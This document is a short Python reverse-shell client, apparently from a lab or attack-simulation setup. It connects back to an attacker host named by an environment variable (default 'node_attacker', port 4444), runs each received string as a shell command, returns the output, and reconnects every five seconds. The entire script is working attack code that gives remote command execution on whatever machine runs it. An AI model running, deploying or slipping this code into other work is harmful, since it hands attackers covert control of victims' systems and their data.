#!/bin/python3

import socket
import subprocess
import os
import time

def create_connection(target, port):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((target, port))
    print("phishing successful")
    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


if __name__ == '__main__':
    attacker_host = os.getenv("ATTACKER_ADDRESS", "node_attacker")
    attacker_port = int(os.getenv("ATTACKER_PORT", 4444))
    print(f"Back-connect to {attacker_host}:{attacker_port}")
    while True:
        try:
            create_connection(attacker_host, attacker_port)
        except Exception as ex:
            print(f"Unable to connect to the attacker due to {ex}")
            time.sleep(5)
